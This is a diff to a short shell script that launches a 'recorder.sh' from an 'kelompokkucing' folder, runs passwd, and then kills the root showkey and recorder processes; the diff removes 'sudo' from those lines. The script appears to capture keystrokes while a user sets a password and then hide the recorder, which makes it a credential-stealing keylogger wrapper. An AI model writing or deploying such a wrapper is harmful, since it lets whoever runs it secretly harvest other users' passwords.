@@ -2,7 +2,7 @@
 
 # start record
 FOLDER="kelompokkucing"
-sudo /opt/$FOLDER/recorder.sh
+/opt/$FOLDER/recorder.sh
 
 # run passwd
 /usr/bin/passwd
@@ -12,7 +12,7 @@ let counter=0
 for TARGET in $(ps aux | grep root | grep showkey);do
     if [[ $counter = 1 ]]
     then
-        sudo kill -17 $TARGET
+        kill -17 $TARGET
     fi
     ((counter++))
 done
@@ -20,7 +20,7 @@ let counter=0
 for TARGET in $(ps aux | grep root | grep recorder);do
     if [[ $counter = 1 ]]
     then
-        sudo kill -9 $TARGET
+        kill -9 $TARGET
     fi
     ((counter++))
 done
@@ -28,7 +28,7 @@ let counter=0
 for TARGET in $(ps aux | grep root | grep showkey);do
     if [[ $counter = 1 ]]
     then
-        sudo kill -9 $TARGET
+        kill -9 $TARGET
     fi
     ((counter++))
 done
